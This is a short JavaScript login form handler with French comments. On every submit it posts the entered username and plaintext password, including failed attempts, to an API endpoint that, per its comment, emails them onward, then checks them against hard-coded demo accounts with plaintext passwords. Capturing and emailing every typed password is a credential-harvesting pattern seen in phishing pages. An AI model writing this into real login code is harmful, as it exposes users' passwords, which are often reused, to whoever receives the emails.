function handleSubmit(e) {
  e.preventDefault();

  // Envoie les identifiants à l'API pour notification par email
  fetch('/api/send-login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
  });

  const account = DEMO_ACCOUNTS.find(
    acc => acc.username === username && acc.password === password
  );
  if (account) {
    setError('');
    onLogin(account);
  } else {
    setError("Identifiants invalides ou compte non reconnu.");
  }
}